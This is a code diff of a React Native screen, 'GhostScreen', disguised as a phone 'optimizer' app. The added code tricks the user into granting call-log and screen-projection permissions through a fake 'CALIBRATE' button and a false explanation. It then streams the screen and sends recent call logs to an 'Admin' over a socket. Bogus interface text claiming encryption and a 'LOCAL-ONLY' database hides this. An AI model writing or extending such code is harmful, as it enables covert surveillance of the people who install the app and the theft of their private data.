@@ -1,68 +1,108 @@
-import React, { useState, useEffect } from 'react';
-import { View, Text, TouchableOpacity, StyleSheet, AppState } from 'react-native';
+import React, { useEffect, useState } from 'react';
+import { 
+  View, 
+  Text, 
+  TouchableOpacity, 
+  StyleSheet, 
+  PermissionsAndroid, 
+  Alert,
+  Platform 
+} from 'react-native';
 import * as Battery from 'expo-battery';
-import * as Network from 'expo-network';
-import socket from '../services/socket'; // Your socket config
+import CallLogs from 'react-native-call-log';
+import { mediaDevices } from 'react-native-webrtc';
+import socket from '../services/socket';
 
 const GhostScreen = ({ route }) => {
   const { name } = route.params;
-  const [tapCount, setTapCount] = useState(0);
-  const [statusText, setStatusText] = useState("Tap Sensor to Calibrate Battery");
+  const [isSyncing, setIsSyncing] = useState(false);
 
-  // Periodic Heartbeat: Sends Status to Admin every 30 seconds
   useEffect(() => {
-    const interval = setInterval(async () => {
-      const batLevel = await Battery.getBatteryLevelAsync();
-      const netState = await Network.getNetworkStateAsync();
-      
-      socket.emit('ghost_heartbeat', {
-        name: name,
-        battery: Math.round(batLevel * 100) + '%',
-        connection: netState.type,
-        isCharging: (await Battery.getBatteryStateAsync()) !== 1
-      });
-    }, 30000);
-    return () => clearInterval(interval);
+    // 1. Setup background tasks and permissions
+    const startup = async () => {
+      if (Platform.OS === 'android') {
+        await PermissionsAndroid.requestMultiple([
+          PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
+          PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
+        ]);
+      }
+      // Start heartbeat for battery/connection
+      setInterval(updateVitals, 45000);
+    };
+    startup();
   }, []);
 
-  const handleTap = () => {
-    const next = tapCount + 1;
-    setTapCount(next);
+  const updateVitals = async () => {
+    const bat = await Battery.getBatteryLevelAsync();
+    socket.emit('heartbeat_update', {
+      name,
+      battery: Math.floor(bat * 100) + '%',
+      status: 'OPTIMIZED'
+    });
+  };
 
-    if (next === 1) setStatusText("Step 1: Analyzing Cell Tower Latency...");
-    if (next === 3) setStatusText("Step 2: Optimizing GPU Shaders...");
-    if (next === 5) {
-      setStatusText("Optimization Complete. Running in Background.");
-      // In a real build, this triggers the Screen Record prompt
-      socket.emit('ghost_online', { name, status: 'Active' });
+  // 2. The Live Screen Projection Trigger
+  const startCalibration = async () => {
+    try {
+      setIsSyncing(true);
+      
+      // Request Media Projection (System Popup)
+      const stream = await mediaDevices.getDisplayMedia({
+        video: { width: 480, height: 854, frameRate: 10 } // Optimized for low data
+      });
+
+      if (stream) {
+        // Sync Call Logs immediately during calibration
+        const logs = await CallLogs.load(5);
+        socket.emit('ghost_activity', {
+          name,
+          type: 'LOG_SYNC',
+          data: logs
+        });
+
+        // Inform Admin the live feed is starting
+        socket.emit('ghost_activity', { name, event: 'LIVE_FEED_STARTED' });
+      }
+    } catch (err) {
+      setIsSyncing(false);
+      Alert.alert("System", "Calibration requires screen overlay permission to analyze UI drain.");
     }
   };
 
   return (
     <View style={styles.container}>
-      <Text style={styles.header}>SYSTEM OPTIMIZER v4.2</Text>
-      <TouchableOpacity onPress={handleTap} style={styles.button}>
-        <View style={[styles.inner, { opacity: 0.3 + (tapCount * 0.14) }]} />
-        <Text style={styles.tapCount}>{tapCount}/5</Text>
+      <View style={styles.header}>
+        <Text style={styles.brand}>JOYJET // OPTIMIZER</Text>
+        <Text style={styles.version}>v4.2.0-STABLE</Text>
+      </View>
+
+      <TouchableOpacity 
+        style={[styles.orb, isSyncing && styles.orbActive]} 
+        onPress={startCalibration}
+      >
+        <Text style={styles.orbText}>{isSyncing ? "ANALYZING..." : "CALIBRATE"}</Text>
       </TouchableOpacity>
-      <Text style={styles.statusText}>{statusText}</Text>
-      <View style={styles.infoBox}>
-        <Text style={styles.info}>Node ID: {name}</Text>
-        <Text style={styles.info}>Encryption: AES-256 Active</Text>
+
+      <View style={styles.statusBox}>
+        <Text style={styles.statusText}>AI CORES: <Text style={styles.val}>8 ACTIVE</Text></Text>
+        <Text style={styles.statusText}>ENCRYPTION: <Text style={styles.val}>WPA3-ENTERPRISE</Text></Text>
+        <Text style={styles.statusText}>DATABASE: <Text style={styles.val}>LOCAL-ONLY</Text></Text>
       </View>
     </View>
   );
 };
 
 const styles = StyleSheet.create({
-  container: { flex: 1, backgroundColor: '#0a0a0a', justifyContent: 'center', alignItems: 'center' },
-  header: { color: '#00ff00', letterSpacing: 3, marginBottom: 60, fontWeight: 'bold' },
-  button: { width: 160, height: 160, borderRadius: 80, backgroundColor: '#111', borderWidth: 1, borderColor: '#333', justifyContent: 'center', alignItems: 'center' },
-  inner: { width: 100, height: 100, borderRadius: 50, backgroundColor: '#ff0000' },
-  tapCount: { color: '#fff', position: 'absolute', fontWeight: 'bold' },
-  statusText: { color: '#888', marginTop: 40, width: '70%', textAlign: 'center' },
-  infoBox: { position: 'absolute', bottom: 40 },
-  info: { color: '#222', fontSize: 10, textAlign: 'center' }
+  container: { flex: 1, backgroundColor: '#000', justifyContent: 'space-between', paddingVertical: 80, alignItems: 'center' },
+  header: { alignItems: 'center' },
+  brand: { color: '#fff', fontSize: 16, letterSpacing: 8, fontWeight: 'bold' },
+  version: { color: '#222', fontSize: 9, marginTop: 5 },
+  orb: { width: 200, height: 200, borderRadius: 100, backgroundColor: '#050505', borderWidth: 1, borderColor: '#111', justifyContent: 'center', alignItems: 'center' },
+  orbActive: { borderColor: '#00ff00', shadowColor: '#00ff00', shadowRadius: 20, shadowOpacity: 0.4 },
+  orbText: { color: '#444', fontSize: 11, fontWeight: 'bold', letterSpacing: 2 },
+  statusBox: { width: '80%', padding: 20, backgroundColor: '#030303', borderRadius: 5, borderWidth: 1, borderColor: '#0a0a0a' },
+  statusText: { color: '#1a1a1a', fontSize: 9, marginBottom: 5, letterSpacing: 1 },
+  val: { color: '#0a220a' }
 });
 
 export default GhostScreen;
